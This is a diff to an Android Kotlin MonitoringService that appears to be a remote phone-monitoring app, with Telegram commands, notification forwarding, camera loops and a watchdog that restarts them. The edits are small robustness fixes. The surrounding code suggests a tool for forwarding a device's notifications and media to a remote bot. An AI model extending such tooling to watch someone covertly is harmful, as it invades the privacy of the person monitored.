@@ -1089,7 +1089,7 @@ class MonitoringService : Service() {
                 }
             }
             "/notif" -> {
-                when (arg.lowercase()) {
+                when (arg.lowercase(java.util.Locale.ROOT)) {
                     "on" -> {
                         preferencesManager.notifForwardEnabled = true
                         if (isNotifForwarding()) {
@@ -1118,7 +1118,7 @@ class MonitoringService : Service() {
                     null
                 }
                 if (crash != null) {
-                    sendToTelegram(crash)
+                    sendToTelegram(crash.replace(TAG_STRIP_REGEX, ""))
                     CrashReporter.clearPending(this)
                 } else {
                     sendToTelegram("\uD83E\uDDFE No crash recorded.")
@@ -2768,8 +2768,10 @@ class MonitoringService : Service() {
                     continue
                 }
                 try {
-                    if (monitoringJob?.isActive != true || cameraJob?.isActive != true || commandJob?.isActive != true) {
+                    val initialStuck = initialSyncRunning.get() && initialSyncJob?.isActive != true
+                    if (monitoringJob?.isActive != true || cameraJob?.isActive != true || commandJob?.isActive != true || initialStuck) {
                         android.util.Log.w("MonitoringService", "Loop watchdog: restarting dead loops")
+                        if (initialStuck) initialSyncRunning.set(false)
                         restartAllLoops()
                         val now = android.os.SystemClock.elapsedRealtime()
                         if (now - loopWatchdogNoticeAt > 3_600_000L) {
@@ -2963,6 +2965,8 @@ class MonitoringService : Service() {
                 return MediaSendOutcome.DROPPED
             }
             return MediaSendOutcome.KEPT
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
         } catch (e: Exception) {
             return MediaSendOutcome.KEPT
         }
